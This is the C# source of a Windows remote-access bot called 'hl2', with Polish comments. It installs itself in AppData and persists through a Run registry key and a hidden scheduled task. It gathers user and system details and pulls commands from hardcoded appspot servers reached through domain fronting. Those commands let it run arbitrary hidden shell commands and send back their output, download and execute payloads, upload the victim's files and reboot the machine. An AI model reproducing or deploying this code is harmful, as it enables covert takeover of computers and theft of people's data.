using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;

namespace hl2
{
    // Main class
    class Program
    {
        //Entry Point Method
        static void Main(string[] args)
        {
#if DEBUG
            Console.WriteLine("### DEBUG (MAIN) 003: kilka linni na dzień dobry:");
            Console.WriteLine("Hello Lord v2");
            Console.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            Console.WriteLine("MachineName: {0}", Environment.MachineName);
            Console.WriteLine("### end DEBUG (MAIN) 003\n");
#endif
            //ustawianie "working directory" dla autostartu z rejestru:
            //https://stackoverflow.com/questions/837488/how-can-i-get-the-applications-path-in-a-net-console-application
            //Uri uri = new Uri(Assembly.GetExecutingAssembly().CodeBase);
            //string path = Path.GetDirectoryName(uri.LocalPath);
            //Directory.SetCurrentDirectory(path);

            string dirNameDefault = String.Concat(Process.GetCurrentProcess().ProcessName, "");
            string dirPathDefault = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 
                + "\\" + dirNameDefault);

            Uri uri = new Uri(Assembly.GetExecutingAssembly().CodeBase);
            string dirPathCurrent = Path.GetDirectoryName(uri.LocalPath);

            string fileNameExe = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            string filePathCurrentExe = Path.Combine(dirPathCurrent, fileNameExe);

            // sprawdzamy czy źródłowy plik uruchomieniowy jest inny niż docelowy:
            // jesli tak to kopiujemy (lub nadpisujemy jesli istnieje w docelowym miejscu)
            if (dirPathCurrent != dirPathDefault)
            {
                Directory.CreateDirectory(dirPathDefault);
                File.Copy(filePathCurrentExe, Path.Combine(dirPathDefault, fileNameExe), true);
            }

            Directory.SetCurrentDirectory(dirPathDefault);

            //katalog do ktorego wrzucić:
            //string dir1 = DateTime.Now.ToString("yyyy-MM-dd_HH:mm:ss");
            //string dir2 = DateTime.Now.ToString("yyyy-MM-dd_HH:mm:ss");

            //interwał do schedulera, który jest dodawany w Windows (ilośc minut):
            string interval = "60";

            //string hardcoded_real_domain1 = "axial-reference-192610.appspot.com";
            string hardcoded_front_config_domain1 = "google.com";
            string hardcoded_front_post_domain1 = "google.com";
            string hardcoded_front_get_domain1 = "google.com";
            //string hardcoded_front_get_domain1 = "";

            string hardcoded_config_domain1 = "domain1-196969.appspot.com";
            string hardcoded_config_domain1_url = "";
            string hardcoded_post_domain1 = "php-post-server-195907.appspot.com";
            string hardcoded_post_domain1_url = "post.php";
            string hardcoded_get_domain1 = "php-post-server-195907.appspot.com";
            //string hardcoded_get_domain1 = "katkat.tk";

            string socat = "socat.exe";
            string socat_zip = "socat.zip";

            // !!!!!!!!!
            // !!!!!!!!! STEP 90 
            // !!!!!!!!!
            // zbieramy podstawowe dane do słownika:
            //
            var myDictionary = new Dictionary<string, string>
            {
                { "Hostname", "localhost" },
                { "BotVer", "2.0.5.2" },
            };
            
            //Add or Update słownik:
            myDictionary["OSVersion"] = Environment.OSVersion.ToString();
            myDictionary["DotNetVersion"] = Environment.Version.ToString();
            myDictionary["OSLang"] = CultureInfo.InstalledUICulture.Name;
            myDictionary["TZone"] = TimeZone.CurrentTimeZone.StandardName;
            myDictionary["TZoneDaylight"] = TimeZone.CurrentTimeZone.DaylightName;
            myDictionary["UserDomainName"] = Environment.UserDomainName;
            myDictionary["UserName"] = Environment.UserName;
            

            // !!!!!!!!!
            // !!!!!!!!! STEP 100 
            // !!!!!!!!!
            // sprawdzamy czy jest BotID w rejestrze, jesli nie to losuje i ustawia:
            //
            string botID = Klasy.ConfigureRegistry("Software\\hl2", "ID", "");
            myDictionary["BotID"] = botID;
            string hostname = Environment.MachineName + "_" + botID;
            myDictionary["Hostname"] = hostname;


            // !!!!!!!!!
            // !!!!!!!!! STEP 200 
            // !!!!!!!!!
            // ustawiamy klucz w rejestrze do autostartu:
            //
            Klasy.ConfigureRegistry("Software\\Microsoft\\Windows\\CurrentVersion\\Run", dirNameDefault,
                dirPathDefault + "\\" + fileNameExe);


            // !!!!!!!!!
            // !!!!!!!!! STEP 270 
            // !!!!!!!!!
            // sprawdzamy czy jest połączenie z siecią:
            //
            //jesli nie ma sieci, wyjdź:
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                Environment.Exit(0);
            }
            
            IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
            string hostip = hostEntry.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            myDictionary["HostIP"] = hostip;

            
            // !!!!!!!!!
            // !!!!!!!!! STEP 300 
            // !!!!!!!!!
            // sprawdzamy czy jest plik z konfigiem, jesli nie ma to go tworzymy:
            //
            string fileConfig = "config.db";
            string fileConfigEncrypt = "config.enc";
            string filePathConfig = Path.Combine(dirPathDefault, fileConfig);
            string filePathConfigEncrypt = Path.Combine(dirPathDefault, fileConfigEncrypt);
            var newkonfig = new Dictionary<string, string> { };
            var oldkonfig = new Dictionary<string, string> { };
            var oldkonfigDecrypt = new Dictionary<string, string> { };

            if (!File.Exists(filePathConfigEncrypt))
            {
                //jesli nie ma socat to sciągamy:
                if (!File.Exists(socat))
                {
                    Klasy.GetFileFunkcjaSSL(hardcoded_front_get_domain1, hardcoded_get_domain1, socat_zip, socat_zip);
                    ZipFile.ExtractToDirectory(socat_zip, dirPathDefault);
                }

                var hardcodedkonfig = new Dictionary<string, string> { };
                hardcodedkonfig["front_config_d1"] = hardcoded_front_config_domain1;
                hardcodedkonfig["front_post_d1"] = hardcoded_front_post_domain1;
                hardcodedkonfig["front_get_d1"] = hardcoded_front_get_domain1;

                hardcodedkonfig["config_d1"] = hardcoded_config_domain1;
                hardcodedkonfig["config_d1_url"] = hardcoded_config_domain1_url;
                hardcodedkonfig["post_d1"] = hardcoded_post_domain1;
                hardcodedkonfig["post_d1_url"] = hardcoded_post_domain1_url;
                hardcodedkonfig["get_d1"] = hardcoded_get_domain1;
                hardcodedkonfig["interval"] = interval;
                hardcodedkonfig["config_v"] = "0";
                hardcodedkonfig["bots"] = "_all_";
                hardcodedkonfig["command"] = "";
                hardcodedkonfig["command_arg"] = "";

                string content = Klasy.GetFunkcjaHTTPSoverSSL(hardcoded_front_config_domain1, hardcoded_config_domain1,
                    hardcoded_config_domain1_url);

                newkonfig = Klasy.StringToDict(content);

                //łaczymu oba słowniki, grupujemy po kluczach
                //nastepnie do ostatecznego słownika wrzucamy tylko ostatnie wystąpienie danego klucza
                //ostatnie czyli z konfigu sciagniętego powyzej ze strony
                newkonfig = newkonfig.Concat(hardcodedkonfig).GroupBy(d => d.Key)
                    .ToDictionary(d => d.Key, d => d.First().Value);

                string newcontent = string.Join(";", newkonfig.Select(x => x.Key + "=" + x.Value));
                Klasy.ZapiszDoPliku(Klasy.EncryptText(newcontent, Klasy.SecureString(), botID), filePathConfigEncrypt);

            }

            //jesli jest to go aktualizujemy:
            else
            {
                //jesli plik istnieje to go czytamy i zapisujemy do słownika oldkonfig:
                string oldcontentDecrypt = Klasy.DecryptFile(filePathConfigEncrypt, Klasy.SecureString(), botID);
                oldkonfigDecrypt = Klasy.StringToDict(oldcontentDecrypt);

                hardcoded_front_config_domain1 = oldkonfigDecrypt["front_config_d1"];
                hardcoded_config_domain1 = oldkonfigDecrypt["config_d1"];
                hardcoded_config_domain1_url = oldkonfigDecrypt["config_d1_url"];

                //sciagamy nowy konfig z tej strony (jesli był uaktualniony na stronie) i zapisujemy do słownika konfig: 
                string content = Klasy.GetFunkcjaHTTPSoverSSL(hardcoded_front_config_domain1, hardcoded_config_domain1,
                    hardcoded_config_domain1_url);

                var konfig = new Dictionary<string, string> { };
                konfig = Klasy.StringToDict(content);

                //łaczymu oba słowniki, grupujemy po kluczach
                //nastepnie do ostatecznego słownika wrzucamy tylko ostatnie wystąpienie danego klucza
                //ostatnie czyli z konfigu sciagniętego powyzej ze strony
                newkonfig = konfig.Concat(oldkonfigDecrypt).GroupBy(d => d.Key)
                    .ToDictionary(d => d.Key, d => d.First().Value);

                File.Delete(filePathConfigEncrypt);
                string newcontent = string.Join(";", newkonfig.Select(x => x.Key + "=" + x.Value));
                Klasy.ZapiszDoPliku(Klasy.EncryptText(newcontent, Klasy.SecureString(), botID), filePathConfigEncrypt);
            }


            // !!!!!!!!!
            // !!!!!!!!! STEP 325 
            // !!!!!!!!!
            // dodajemy zadanie do schedulera za pomocą SchTasks,
            // wywołujemy to za pomocą cmd.exe /C ...
            // nawet jesli istnieje to nadpisujemy
            // nie pokazuje się okno cmd w którym tworzone jest zadanie schedulera
            // trik wzięty z: 
            // https://stackoverflow.com/questions/23246613/hiding-the-process-window-why-isnt-it-working
            //

            //Zapisujemy XML z zdaniem do schedulera, które później zaimportujemy:
            if (oldkonfigDecrypt.ContainsKey("interval"))
            {
                interval = oldkonfigDecrypt["interval"];
            }
            myDictionary["Interval"] = interval;
            Klasy.TaskSchedXML(interval, Path.Combine(dirPathDefault, fileNameExe), dirPathDefault);

            ProcessStartInfo info = new ProcessStartInfo("cmd.exe");

            info.RedirectStandardOutput = true;
            info.RedirectStandardError = true;
            info.CreateNoWindow = true;
            info.UseShellExecute = false;
            //info.Arguments = "/C SchTasks /Create /SC MINUTE /TN Lord2 /TR C:\\Users\\cw\\AppData\\Local\\HelloLord2\\HelloLord2.exe /F";
            //info.Arguments = "/C SchTasks /Create /SC MINUTE /MO 1 /TN Lord2 /F /TR " + dirPath + "\\" + fileName;

            string temp = Path.GetTempPath();
            info.Arguments = "/C SchTasks /Create /TN hl2 /XML " + temp + "hl2.xml /F";

            Process proc = Process.Start(info);



            // !!!!!!!!!
            // !!!!!!!!! STEP 350 
            // !!!!!!!!!
            // interpretujemy "komendy", wysyłamy info na POST serwer:

            string front_config_domain = newkonfig["front_config_d1"];
            string front_post_domain = newkonfig["front_post_d1"];
            string front_get_domain = newkonfig["front_get_d1"];
            string config_domain = newkonfig["config_d1"];
            string config_domain_url = newkonfig["config_d1_url"];
            string post_domain = newkonfig["post_d1"];
            string post_domain_url = newkonfig["post_d1_url"];
            string get_domain = newkonfig["get_d1"];
            string command = "";
            string command_arg = "";






            //string contentX = Klasy.GetFunkcjaHTTPSoverSSL(hardcoded_front_config_domain1, hardcoded_config_domain1,
            //        hardcoded_config_domain1_url);
            //Environment.Exit(0);




            



            //jesli w konfigu ((jest klucz "bots") *ORAZ* (klucz ten równa sie _all_ *LUB* konkretne ID))
            // *ORAZ* config version jest większy niz dotychczasowy, to interpretujemy komendy! :D
            //ale najsampierw konwertujemy numer wersji konfigu na intedżery:
            int new_konfig_v = 1;
            int old_konfig_v = 0;

            if (newkonfig.ContainsKey("config_v"))
            {
                new_konfig_v = Convert.ToInt32(newkonfig["config_v"]);
            }

            if (oldkonfig.ContainsKey("config_v"))
            {
                old_konfig_v = Convert.ToInt32(oldkonfig["config_v"]);
            }

            if ((newkonfig.ContainsKey("bots") && (newkonfig["bots"] == "_all_" || newkonfig["bots"] == botID)) 
                && new_konfig_v > old_konfig_v)
            {
                //jesli jestes maszyną na której jest poniższy ID, to wyjdz natychmiast :)
                if (botID == "w3y3murw")
                {
                    Environment.Exit(0);
                }

                if (newkonfig.ContainsKey("command") && newkonfig["command"].Length >0)
                {
                    command = newkonfig["command"];

                    if (newkonfig.ContainsKey("command_arg") && newkonfig["command_arg"].Length > 0)
                    {
                        command_arg = newkonfig["command_arg"];
                    }
#if DEBUG
                    else
                    {
                        Console.WriteLine("konfig nie zawiera klucza command_arg");
                    }
#endif

                    if (command == "download")
                    {
                        if (command_arg.Length > 0)
                        {
                            Klasy.GetFileFunkcjaHTTPSoverSSL(front_get_domain, get_domain, command_arg, 
                                Path.Combine(dirPathDefault, command_arg));

                            //var statusDic = new Dictionary<string, string> { };
                            myDictionary["Hostname"] = hostname + "_DOWNLOAD";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;
                            myDictionary["Status"] = "OK";
                            Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                        }
                    }

                    //słuzy do wykonania polecenia w cmd
                    //bot *czeka* na wykonanie polecenia i output wysyła na post serwer:
                    else if (command == "cmd_comm_run_wait_i_send")
                    {
                        if (command_arg.Length > 0)
                        {
                            ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
                            cmd.RedirectStandardOutput = true;
                            cmd.RedirectStandardError = true;
                            cmd.CreateNoWindow = true;
                            cmd.UseShellExecute = false;

                            command_arg = command_arg.Replace('_', ' ');
                            string logfileName = "temp.log";
                            string logfilePath = Path.Combine(dirPathDefault, logfileName);
                            //jako argumenty podajemy polecenie oraz output kazemy przekierować do pliku:
                            cmd.Arguments = command_arg + " > " + logfilePath;

                            Process proc_cmd = Process.Start(cmd);
                            //czekamy az skonczy:
                            proc_cmd.WaitForExit();

                            //wysyłamy powyższy plik, do którego przekierowano output polecenia:
                            Klasy.PostFileFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, hostname,
                                logfilePath, logfileName, logfileName, hostname + "_CMD_OUTPUT_FILE");

                            //var statusDic = new Dictionary<string, string> { };
                            myDictionary["Hostname"] = hostname + "_CMD_OUTPUT";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;
                            myDictionary["Status"] = "OK";
                            Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                        }
                    }

                    //słuzy do wykonania polecenia w cmd
                    //bot *nie* czeka na wykonanie polecenia:
                    else if (command == "cmd_comm_run_i_exit")
                    {
                        if (command_arg.Length > 0)
                        {
                            ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
                            cmd.RedirectStandardOutput = true;
                            cmd.RedirectStandardError = true;
                            cmd.CreateNoWindow = true;
                            cmd.UseShellExecute = false;

                            string cmd_arg = command_arg.Replace('_', ' ');
                            cmd.Arguments = cmd_arg;

                            Process proc_cmd = Process.Start(cmd);

                            //var statusDic = new Dictionary<string, string> { };
                            myDictionary["Hostname"] = hostname + "_CMD_RUN_EXIT";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;
                            myDictionary["Status"] = "OK";
                            Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                        }
                    }

                    else if (command == "reboot")
                    {
                        ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
                        cmd.RedirectStandardOutput = true;
                        cmd.RedirectStandardError = true;
                        cmd.CreateNoWindow = true;
                        cmd.UseShellExecute = false;

                        //jako argumenty podajemy polecenie oraz output kazemy przekierować do pliku:
                        cmd.Arguments = "/C shutdown /g /t 10";

                        Process proc_cmd = Process.Start(cmd);

                        //var statusDic = new Dictionary<string, string> { };
                        myDictionary["Hostname"] = hostname + "_REBOOT";
                        myDictionary["Command"] = command;
                        myDictionary["CommandArg"] = command_arg;
                        myDictionary["Status"] = "OK";
                        Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                    }

                    else if (command == "update")
                    {
                        if (command_arg.Length > 0)
                        {
                            //sciągamy nowe wersję:
                            Klasy.GetFileFunkcjaHTTPSoverSSL(front_get_domain, get_domain, command_arg, 
                                Path.Combine(dirPathDefault, command_arg));
                            //sciągamy updater:
                            Klasy.GetFileFunkcjaHTTPSoverSSL(front_get_domain, get_domain, "upd.exe", 
                                dirPathDefault + "\\upd.exe");

                            string cur_proces = Process.GetCurrentProcess().ProcessName;

                            //uruchamiamy updater
                            ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
                            cmd.RedirectStandardOutput = true;
                            cmd.RedirectStandardError = true;
                            cmd.CreateNoWindow = true;
                            cmd.UseShellExecute = false;

                            //jako argumenty podajemy polecenie, fileName to nazwa obecnego procesu
                            //w updaterze będziemy sprawdzać czy juz jest wyłączony:
                            cmd.Arguments = "/C " + dirPathDefault + "\\upd.exe " + cur_proces + " " + command_arg;

                            //i samo uruchomienie tutaj jest:
                            Process proc_cmd = Process.Start(cmd);

                            //var statusDic = new Dictionary<string, string> { };
                            myDictionary["Hostname"] = hostname + "_UPDATE";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;
                            myDictionary["Status"] = "OK";
                            Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                        }
                    }

                    //sciaga plik i go uruchamia:
                    //nie da sie przekazać parametrów do sciaganego programu
                    else if (command == "dl_i_run")
                    {
                        if (command_arg.Length > 0)
                        {
                            Klasy.GetFileFunkcjaHTTPSoverSSL(front_get_domain, get_domain, command_arg, 
                                Path.Combine(dirPathDefault, command_arg));

                            //uruchamiamy updater
                            ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
                            cmd.RedirectStandardOutput = true;
                            cmd.RedirectStandardError = true;
                            cmd.CreateNoWindow = true;
                            cmd.UseShellExecute = false;

                            cmd.Arguments = "/C " + Path.Combine(dirPathDefault, command_arg);

                            //i samo uruchomienie tutaj jest:
                            Process proc_cmd = Process.Start(cmd);

                            //var statusDic = new Dictionary<string, string> { };
                            myDictionary["Hostname"] = hostname + "_DLandRUN";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;
                            myDictionary["Status"] = "OK";
                            Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                        }
                    }

                    else if (command == "upload")
                    {
                        if (command_arg.Length > 0)
                        {
                            myDictionary["Hostname"] = hostname + "_UPLOAD";
                            myDictionary["Command"] = command;
                            myDictionary["CommandArg"] = command_arg;

                            if (File.Exists(command_arg))
                            {
                                string logfilePath = command_arg;
                                string logfileName = Path.GetFileName(logfilePath);

                                Klasy.PostFileFunkcja(front_post_domain, post_domain, post_domain_url, hostname,
                                    logfilePath, logfileName, logfileName, hostname + "_UPLOAD_FILE");

                                myDictionary["Status"] = "OK";
                                Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                            }
                            else
                            {
                                myDictionary["Hostname"] = hostname + "_UPLOAD_FAILED";
                                myDictionary["Status"] = "FileDoesNotExist";
                                Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
                            }
                        }
                    }
                }
#if DEBUG
                else
                {
                    Console.WriteLine("konfig nie zawiera klucza command");
                }
#endif
            }
            else
            {
#if DEBUG
                Console.WriteLine("konfig nie zawiera klucza bots");
#endif
                myDictionary["Hostname"] = hostname + "_INTERVAL";
                Klasy.PostFunkcjaHTTPSoverSSL(front_post_domain, post_domain, post_domain_url, myDictionary);
            }

            //Czeka na wciśnięcie klawisza:
            //Console.ReadKey();

            /*
            //zabijamy wszystkie socaty:
            foreach (var process in Process.GetProcessesByName("socat"))
            {
                process.Kill();
            }
            */
        }
    }
}
